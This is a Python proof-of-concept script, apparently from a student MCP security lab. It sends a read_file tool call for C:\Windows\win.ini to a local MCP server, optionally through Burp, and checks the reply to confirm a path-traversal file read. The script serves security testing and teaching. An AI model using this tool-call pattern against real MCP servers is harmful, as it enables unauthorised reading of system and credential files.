"""
Project 4 - fire one MCP attack over HTTP, routed through Burp so it lands in
Burp's HTTP History. Target: server_http.py (streamable-http at /mcp).

Run from the project4-mcp-security folder, with server_http.py already running:
    Windows PS:  $env:BURP_PROXY="http://127.0.0.1:8080"; python burp_attack_client.py
    Kali:        BURP_PROXY=http://127.0.0.1:8080 python3 burp_attack_client.py
Omit BURP_PROXY to hit the server directly (no proxy) - useful to smoke-test.
"""
import os
import asyncio

# Route httpx (used by the MCP client) through Burp BEFORE importing the client.
_burp = os.environ.get("BURP_PROXY")
if _burp:
    os.environ["HTTP_PROXY"] = _burp
    os.environ["HTTPS_PROXY"] = _burp
    os.environ["ALL_PROXY"] = _burp
    print(f"[*] Routing through Burp proxy {_burp}")
else:
    print("[*] No BURP_PROXY set - hitting the server directly")

from mcp import ClientSession
from mcp.client.streamable_http import streamablehttp_client

URL = "http://127.0.0.1:8000/mcp"
ATTACK_PATH = r"C:\Windows\win.ini"


async def main():
    async with streamablehttp_client(URL) as (read, write, _):
        async with ClientSession(read, write) as session:
            await session.initialize()                         # POST /mcp (initialize)
            r = await session.call_tool("read_file", {"path": ATTACK_PATH})  # POST /mcp (tools/call)
            text = "\n".join(getattr(c, "text", "") for c in (r.content or []))
            confirmed = ("16-bit app support" in text) or ("[fonts]" in text)
            print("YES - traversal confirmed" if confirmed else "no - unexpected response")
            print("--- server response (first 200 chars) ---")
            print(text[:200])


if __name__ == "__main__":
    asyncio.run(main())
